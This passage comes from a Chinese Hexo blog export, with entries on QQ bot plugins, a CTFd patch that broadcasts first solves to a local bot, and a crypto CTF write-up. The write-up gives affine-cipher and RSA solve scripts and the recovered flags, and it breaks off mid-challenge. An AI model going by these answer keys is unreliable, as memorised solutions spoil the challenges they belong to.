<h4 id="使用格式-10"><a href="#使用格式-10" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li><p>使用方法：</p>
<ul>
<li><p>设置词条命令由<code>问句</code>和<code>答句</code>组成。设置之后，收到<code>消息</code>时触发。并非所有人都可以设置词条，详见<a href="https://github.com/Joenothing-lst/word-bank#permission">权限</a></p>
</li>
<li><p><code>问句</code>及其关键字</p>
<ul>
<li><p>问，当<code>问句</code>和<code>消息</code>全等时才会匹配（所有人均可以使用）<br>例子：问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | -          |<br>| 你不理我 | -          |</p>
</li>
<li><p>模糊问，当<code>问句</code>出现在<code>消息</code>里时则会匹配（只有超级用户可以使用）<br>例子：模糊问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | -          |</p>
</li>
<li><p>正则问，当<code>问句</code>被<code>消息</code>正则捕获时则会匹配（只有超级用户可以使用）<br>例子：正则问[他你]不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | 你被屏蔽了 |</p>
</li>
<li><p>全局问，在所有群聊和私聊中都可以触发，可以和以上几种组合使用。（只有超级用户可以使用）<br>例子：全局模糊问不理我答你被屏蔽了</p>
</li>
</ul>
</li>
<li><p><code>答句</code></p>
<ul>
<li><p><code>/at</code> + <code>qq号</code>，当答句中包含<code>/at</code> + <code>qq号</code>时将会被替换为@某人（即<code>CQ码</code>）<br>例子：问群主在吗答/at123456789在吗</p>
<p>| 群主qq号  | 消息     | 回复       |<br>| ————- | ———— | ————— |<br>| 123456789 | 群主在吗 | @群主 在吗 |</p>
</li>
<li><p><code>/self</code>，当答句中包含<code>/self</code>时将会被替换为发送者的群昵称<br>例子：问你好答/self你好啊</p>
<p>| 发送者 | 消息 | 回复       |<br>| ——— | —— | ————— |<br>| 皆无   | 你好 | 皆无你好啊 |</p>
</li>
<li><p><code>/atself</code>，当答句中包含<code>/atself</code>时将会被替换为@发送者 例子：问你好答/atself你好啊</p>
<p>| 发送者 | 消息 | 回复        |<br>| ——— | —— | —————- |<br>| 皆无   | 你好 | @皆无你好啊 |</p>
</li>
<li><p><code>/ban</code>，当答句中包含<code>/ban</code>后紧跟数字时将会禁言发送者，单位为秒，默认为300 例子：问你好答/ban30你将被禁言30秒</p>
</li>
</ul>
</li>
<li><p>删除</p>
<ul>
<li>删除词条+需要删除的<code>问句</code><br>例子：删除词条你好</li>
<li>删除全局词条+需要删除的<code>问句</code><br>例子：删除全局词条你好</li>
<li>删除全局词库<br>例子：删除全局词库</li>
<li>删除全部词库<br>例子：删除全部词库</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="修复离谱bug"><a href="#修复离谱bug" class="headerlink" title="修复离谱bug"></a>修复离谱bug</h4><p>原版的bug真的是一堆了。在<strong>问</strong>和<strong>答</strong>中间加上一些空格，就能直接让词条变成不可删除状态。这bug。。。总之，修了。问答中间不允许出现空格。</p>
<h4 id="示例图-10"><a href="#示例图-10" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/29/hLpeNSjOIG9gqrU.png" alt="image-20211229000614211"></p>
<h4 id="额外-1"><a href="#额外-1" class="headerlink" title="额外"></a>额外</h4><p>原先权限设置的很开，用户可以肆无忌惮的加全局词库，互相干扰。于是把权限缩小了。</p>
<p>原先权限设置的很死，群聊用户没人权。于是把权限放开了。</p>
<p>但是！放开权限意味着更加危险，我可不想因为小号进去了！！！</p>
<p>所以，加了黑名单功能。懂得都懂，直接用一个单独加的测试黑名单进行演示（枫霜月雨是全宇宙最帅的人）。</p>
<p><img src="https://s2.loli.net/2021/12/28/wiPuF236oOvVQDR.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/Qn21OWAJREGsV8w.png" alt="img"></p>
<p>黑名单设置的不严，希望给群友和好友更好的体验。但是~一旦触发，你懂得。</p>
<blockquote>
<p>根据《治安管理处罚法》第二十五条第一款第一项的规定：散布谣言，谎报险情、警情或者以其他方法故意扰乱公共秩序的，处5日以上10日以下拘留，情节较轻的，处5日以下拘留。</p>
<p>同时，如果当事人的行为造成严重危害，依法追究刑事责任。</p>
</blockquote>
<p>希望人没事。</p>
<h3 id="创建别名"><a href="#创建别名" class="headerlink" title="创建别名"></a>创建别名</h3><p>玩不来，并且权限也有点问题。先挂个参考链接吧。</p>
<h4 id="参考链接-10"><a href="#参考链接-10" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/nonebot/discussions/discussions/74">为nonebot2的指令创建别名</a></p>
<h2 id="仅群聊"><a href="#仅群聊" class="headerlink" title="仅群聊"></a>仅群聊</h2><h3 id="QQ音乐点歌"><a href="#QQ音乐点歌" class="headerlink" title="QQ音乐点歌"></a>QQ音乐点歌</h3><h4 id="参考链接-11"><a href="#参考链接-11" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-simplemusic"><em>基于NoneBot2的最简点歌插件，支持网易云、QQ音乐</em> </a></p>
<h4 id="权限-10"><a href="#权限-10" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式（命令更新为qq点歌）"><a href="#使用格式（命令更新为qq点歌）" class="headerlink" title="使用格式（命令更新为qq点歌）"></a>使用格式（命令更新为qq点歌）</h4><ol>
<li>qq<strong>点歌 歌曲名</strong> 在QQ音乐中搜索指定歌曲，如果没有找到则不会有任何响应</li>
<li>qq<strong>点歌 歌曲名 歌手名</strong> 在QQ音乐中搜索指定歌曲，并试图匹配指定歌手，如果没有找到则不会有任何响应</li>
</ol>
<h4 id="示例图-11"><a href="#示例图-11" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/r4ERbCvitLkxBzP.png" alt="image-20211228234913372"></p>
<p><img src="https://s2.loli.net/2021/12/28/JpMxXb9j2SyKQL3.png" alt="image-20211228235029336"></p>
<h3 id="掷骰子"><a href="#掷骰子" class="headerlink" title="掷骰子"></a>掷骰子</h3><h4 id="参考链接-12"><a href="#参考链接-12" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_roll">扔骰子</a></p>
<h4 id="权限-11"><a href="#权限-11" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-11"><a href="#使用格式-11" class="headerlink" title="使用格式"></a>使用格式</h4><p>rd [x]d[y]</p>
<p>x为数量，y为面数</p>
<h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><ol>
<li>x or y &gt;1024</li>
<li>x or y &lt;0</li>
<li><code>random.randint(1,100) == 99</code></li>
</ol>
<h4 id="示例图-12"><a href="#示例图-12" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/4BMrqbgEpCI8RKf.png" alt="image-20220126224600444"></p>
<h3 id="疯狂星期四"><a href="#疯狂星期四" class="headerlink" title="疯狂星期四"></a>疯狂星期四</h3><h4 id="参考链接-13"><a href="#参考链接-13" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_crazy_thursday">Crazy Thursday</a></p>
<h4 id="权限-12"><a href="#权限-12" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-12"><a href="#使用格式-12" class="headerlink" title="使用格式"></a>使用格式</h4><p>疯狂星期[一到日]</p>
<p>由于我不喜欢文案内容（我的枫酱这么可爱，怎么能说这样的话捏~）改了json里的很多东西。砍了一大半吧。</p>
<h4 id="示例图-13"><a href="#示例图-13" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/2HleKpDdCaINM7R.png" alt="image-20220126225429345"></p>
<h3 id="入群欢迎（原创）"><a href="#入群欢迎（原创）" class="headerlink" title="入群欢迎（原创）"></a>入群欢迎（原创）</h3><p>没啥介绍的，自己写的一个很简单的入群介绍功能，可以定制入群欢迎语。</p>
<h4 id="示例图-14"><a href="#示例图-14" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/C9KXWht7GeFUjb5.png" alt="img"></p>
<h3 id="涩图"><a href="#涩图" class="headerlink" title="涩图"></a>涩图</h3><h4 id="不介绍，不开放"><a href="#不介绍，不开放" class="headerlink" title="不介绍，不开放"></a>不介绍，不开放</h4><h2 id="仅私聊"><a href="#仅私聊" class="headerlink" title="仅私聊"></a>仅私聊</h2><h3 id="定时早晚安（原创）"><a href="#定时早晚安（原创）" class="headerlink" title="定时早晚安（原创）"></a>定时早晚安（原创）</h3><p>技术上可拓展群聊，但是放群里功能鸡肋</p>
<p>定时任务，每天早上5:50和晚上22:00。推送早晚安消息。（城市可定制）</p>
<h3 id="示例图-15"><a href="#示例图-15" class="headerlink" title="示例图"></a>示例图</h3><p><img src="https://s2.loli.net/2021/12/28/WUHw1oNqmXGiVJx.png" alt="image-20211228234711323"></p>
<p><img src="https://s2.loli.net/2021/12/28/zIlHK8Q5fE7tbTM.png" alt="image-20211228234805242"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfbot搭建指南</title>
    <url>/2021/11/19/ctfbot%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="QQbot搭建记录"><a href="#QQbot搭建记录" class="headerlink" title="QQbot搭建记录"></a>QQbot搭建记录</h1><p>简单记录一下搭一个没有带脑子的qqbot的过程。</p>
<span id="more"></span>
<h2 id="无脑版（裸go-cqhttp"><a href="#无脑版（裸go-cqhttp" class="headerlink" title="无脑版（裸go-cqhttp)"></a>无脑版（裸go-cqhttp)</h2><p>从接口和<code>go-cqhttp</code></p>
<p>先去<a href="https://github.com/Mrs4s/go-cqhttp/releases">release</a>上下载，<code>wget</code>就行。</p>
<p>直接走一波<code>./go-cqhttp</code>，然后会出<code>config.yml</code>，如下配置。</p>
<p>反向代理加上脑子才需要，但是先挂出来吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- ws-reverse:</span><br><span class="line">    ## 反向WS Universal 地址</span><br><span class="line">    ## 注意 设置了此项地址后下面两项将会被忽</span><br><span class="line">    universal: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;ws</span><br><span class="line">    ## 反向WS API 地址</span><br><span class="line">    api: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;api</span><br><span class="line">    ## 反向WS Event 地址</span><br><span class="line">    event: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;event</span><br><span class="line">    ## 重连间隔 单位毫秒</span><br><span class="line">    reconnect-interval: 3000</span><br><span class="line">    middlewares:</span><br><span class="line">      &lt;&lt;: *default # 引用默认中间件</span><br></pre></td></tr></table></figure>
<p>然后不行试试<code>127.0.0.1</code>改<code>0.0.0.0</code></p>
<p>还有什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod 777 ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>接着执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>然后建议扫码登录。可以先测试下</p>
<p>测试成功后使用这个命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nohup ./go-cqhttp &gt; go.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>到浏览器中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5700&#x2F;send_private_msg?user_id&#x3D;xxxxx&amp;message&#x3D;aaaa</span><br></pre></td></tr></table></figure>
<p>看看能不能收到消息，收到就成功了。</p>
<p>接着改<code>CTFd/CTFd/api/v1/challenges.py</code></p>
<p>加上这两部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Convert this into a re-useable decorator</span></span><br><span class="line"><span class="keyword">if</span> config.is_teams_mode() <span class="keyword">and</span> team <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">fails = Fails.query.filter_by(</span><br><span class="line">    account_id=user.account_id, challenge_id=challenge_id</span><br><span class="line">).count()</span><br><span class="line"></span><br><span class="line">challenge = Challenges.query.filter_by(<span class="built_in">id</span>=challenge_id).first_or_404()</span><br><span class="line"><span class="comment">#从这开始</span></span><br><span class="line">challenge_name=challenge.name</span><br><span class="line">challenge_category=challenge.category</span><br><span class="line">user_name=user.name <span class="comment">#这里结束</span></span><br><span class="line"><span class="keyword">if</span> challenge.state == <span class="string">&quot;hidden&quot;</span>:</span><br><span class="line">    abort(<span class="number">404</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status:  <span class="comment"># The challenge plugin says the input is right</span></span><br><span class="line">                <span class="keyword">if</span> ctftime() <span class="keyword">or</span> current_user.is_admin():</span><br><span class="line">                    chal_class.solve(</span><br><span class="line">                        user=user, team=team, challenge=challenge, request=request</span><br><span class="line">                    )</span><br><span class="line">                    clear_standings()</span><br><span class="line"></span><br><span class="line">                log(</span><br><span class="line">                    <span class="string">&quot;submissions&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;[&#123;date&#125;] &#123;name&#125; submitted &#123;submission&#125; on &#123;challenge_id&#125; with kpm &#123;kpm&#125; [CORRECT]&quot;</span>,</span><br><span class="line">                    submission=request_data[<span class="string">&quot;submission&quot;</span>].encode(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                    challenge_id=challenge_id,</span><br><span class="line">                    kpm=kpm,</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">#从这里开始加</span></span><br><span class="line">                <span class="comment"># auto-broadcast</span></span><br><span class="line"></span><br><span class="line">                solve_count = Solves.query.filter_by(challenge_id=challenge_id).count()</span><br><span class="line">                blood_number = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> solve_count == <span class="number">1</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;一血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">2</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;二血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">3</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;三血&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">if</span> blood_number:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;是三血&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(challenge_category)  <span class="comment"># 题目分类</span></span><br><span class="line">                    <span class="built_in">print</span>(challenge_name)  <span class="comment"># 题目名称</span></span><br><span class="line">                    <span class="built_in">print</span>(user_name)</span><br><span class="line">                    <span class="built_in">print</span>(blood_number)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;获得[&#123;&#125;]类型题目《&#123;&#125;》 &#123;&#125;! Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name,blood_number)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;不是三血&quot;</span>)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;解出[&#123;&#125;]类型题目《&#123;&#125;》Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血开始推送&#x27;</span>)</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送成功&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送失败&#x27;</span>)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#到这结束    </span></span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="string">&quot;success&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;correct&quot;</span>, <span class="string">&quot;message&quot;</span>: message&#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># The challenge plugin says the input is wrong</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器取证</title>
    <url>/2021/10/15/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e68c94e2dd6a81331d8858e0b8a33e1a4b54d8c985155030b8b69c2c9a2aa54c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>电子取证</category>
      </categories>
      <tags>
        <tag>服务器取证</tag>
      </tags>
  </entry>
  <entry>
    <title>绿城杯密码</title>
    <url>/2021/10/06/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="绿城杯密码题"><a href="#绿城杯密码题" class="headerlink" title="绿城杯密码题"></a>绿城杯密码题</h1><p>出题人是真的垃圾，出的这么简单，被全国的师傅打了不知道多少种解。不会出题可以不出，出这种垃圾题简直是在侮辱做题师傅们的智商。</p>
<span id="more"></span>
<h2 id="warmup-50"><a href="#warmup-50" class="headerlink" title="warmup(50)"></a>warmup(50)</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>密码签到题，给了以下脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">'flag{'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">plain_text, a, b, m</span>):</span></span><br><span class="line">	cipher_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> plain_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			cipher_text += str1[(a*addr+b) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cipher_text += i</span><br><span class="line">	<span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment"># cipher_text = 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br></pre></td></tr></table></figure>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>就一个，一眼就能根据加密算法看出来这是affline cipher。</p>
<p>没什么好多说的，加解密函数</p>
<script type="math/tex; mode=display">
E\left( x \right) \,\,=\,\,\left( ax+b \right) \,\,mod\,\,m
\\
D\left( x \right) \,\,=\,\,a^{-1}\left( x-b \right) \,\,mod\,\,m</script><p>求个逆元完事。</p>
<h3 id="解法一（预期解）"><a href="#解法一（预期解）" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cipher_text = <span class="string">'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affline_decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">	plain_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			plain_text += str1[(addr-b) * inverse(a,m) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			plain_text += i</span><br><span class="line">	<span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line">affline_decode(cipher_text,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment">#flag{AffInE_CIpheR_iS_clAssiC}</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>放进在线工具的仿射密码里，直接能求出flag原文。然后根据加密算法，爆破一下大小写。也是一种不错的解法。这道题和一般的仿射密码的唯一区别在于，一般仿射密码的字母为26个，不区分大小写。而这道题加了大小写的考点，最后肯定是要用到脚本的。</p>
<h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n ='</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = <span class="number">2021</span> * m * <span class="number">1001</span> * p </span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c ='</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line"><span class="comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br></pre></td></tr></table></figure>
<h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>考了个小同余的性质。</p>
<script type="math/tex; mode=display">
\text{如果} a\,\,\equiv \,\,b\,\,\left( mod\,\,m \right) \,\,
\\
\text{则有} \left( a,m \right) \,\,=\,\,\left( b,m \right)</script><p>证明过程不写了，比较简单。</p>
<h3 id="解法一（预期解）-1"><a href="#解法一（预期解）-1" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.gcd(c,n)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)//<span class="number">1001</span>//p//<span class="number">2021</span>))</span><br><span class="line"><span class="comment">#b'flag{Math_1s_1nterest1ng_hah}'</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>rsatools里面竟然有函数能判断<code>n</code>和<code>c</code>是否有相同因子，属实给我蚌埠住了。大意了，没想到还有用工具做RSA的。放进去直接出<code>d</code>了，然后有<code>d</code>和<code>n</code>能求出<code>p</code>和<code>q</code>，答案就出了。</p>
<p>用工具做密码是没有灵魂的。</p>
<h2 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA-2"></a>RSA-2</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="number">20</span>])</span><br><span class="line">p  = getPrime(<span class="number">512</span>)</span><br><span class="line">p1 = gmpy2.next_prime(p)</span><br><span class="line">q  = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = gmpy2.next_prime(q)</span><br><span class="line">n1 = p*q*p1*q1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n1 ='</span>,n1)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c1 ='</span>,c1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag[<span class="number">20</span>:])</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2+q2 ='</span>,p2+q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2*q2 ='</span>,p2*q2)</span><br><span class="line">n2 = p2*p2*q2*q2*q2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n2 ='</span>,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c2 ='</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n1 = 